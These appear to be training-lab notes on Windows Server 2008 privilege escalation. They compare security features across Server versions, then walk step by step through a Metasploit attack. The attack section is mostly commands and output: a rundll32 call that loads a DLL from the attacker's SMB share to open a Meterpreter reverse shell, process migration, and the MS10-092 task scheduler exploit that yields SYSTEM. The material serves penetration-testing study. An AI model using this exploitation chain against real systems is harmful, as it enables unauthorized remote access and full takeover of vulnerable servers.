## Server 2008 vs. Newer Versions
|Feature|Server 2008 R2|Server 2012 R2|Server 2016|Server 2019|
|---|---|---|---|---|
|[Enhanced Windows Defender Advanced Threat Protection (ATP)](https://docs.microsoft.com/en-us/mem/configmgr/protect/deploy-use/defender-advanced-threat-protection)||||X|
|[Just Enough Administration](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1)|Partial|Partial|X|X|
|[Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)|||X|X|
|[Remote Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)|||X|X|
|[Device Guard (code integrity)](https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419)|||X|X|
|[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)|Partial|X|X|X|
|[Windows Defender](https://www.microsoft.com/en-us/windows/comprehensive-security)|Partial|Partial|X|X|
|[Control Flow Guard](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)|||X|X|
## Server 2008 Case Study
#### Querying Current Patch Level

```cmd
C:\htb> wmic qfe
```
#### Running Sherlock

```powershell
PS C:\htb> Set-ExecutionPolicy bypass -Scope process
PS C:\htb> Import-Module .\Sherlock.ps1 
PS C:\htb> Find-AllVulns
```
#### Obtaining a Meterpreter Shell

```shell
msf6 exploit(windows/smb/smb_delivery) > search smb_delivery
msf6 exploit(windows/smb/smb_delivery) > use 0
msf6 exploit(windows/smb/smb_delivery) > show options
```
![](Screenshot%202026-08-26%20at%2008.06.04.png)
![](Screenshot%202026-08-26%20at%2008.06.17.png)
#### Rundll Command on Target Host

```cmd
C:\htb> rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```
#### Receiving Reverse Shell

```shell
msf6 exploit(windows/smb/smb_delivery) > [*] Sending stage (175174 bytes) to 10.129.43.15
```
#### Searching for Local Privilege Escalation Exploit

```shell
msf6 exploit(windows/smb/smb_delivery) > search 2010-3338
```
#### Migrating to a 64-bit Process

```shell
msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1

meterpreter > getpid

meterpreter > ps

meterpreter > migrate 2796

meterpreter > background
```
#### Setting Privilege Escalation Module Options

```shell
msf6 exploit(windows/local/ms10_092_schelevator) > set SESSION 1

SESSION => 1


msf6 exploit(windows/local/ms10_092_schelevator) > set lhost 10.10.14.3

lhost => 10.10.14.3


msf6 exploit(windows/local/ms10_092_schelevator) > set lport 4443

lport => 4443


msf6 exploit(windows/local/ms10_092_schelevator) > show options
```
![](Screenshot%202026-08-26%20at%2008.08.43.png)
#### Receiving Elevated Reverse Shell

```shell
msf6 exploit(windows/local/ms10_092_schelevator) > exploit

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM


meterpreter > sysinfo

Computer        : WINLPE-2K8
OS              : Windows 2008 R2 (6.1 Build 7600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows
```
